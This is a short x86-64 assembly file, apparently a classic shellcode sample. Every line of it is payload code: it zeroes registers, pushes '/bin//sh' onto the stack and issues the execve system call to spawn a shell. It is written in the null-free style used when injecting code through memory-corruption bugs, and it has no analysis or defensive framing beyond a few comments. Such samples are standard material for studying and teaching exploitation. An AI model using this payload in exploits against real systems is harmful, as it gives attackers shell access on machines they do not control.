[BITS 64]
global main

section .text

main:
    xor rax, rax        ;
    push rax            ; zero out rax and push null byte first
    mov rsi, "/bin//sh" ; move string to rsi
	push rsi            ; push string to stack
    mov rdi, rsp        ; load stack to register
    xor rsi, rsi        ; zero out unused registers
    xor rdx, rdx
    mov al, 59          ;syscall for execve
    syscall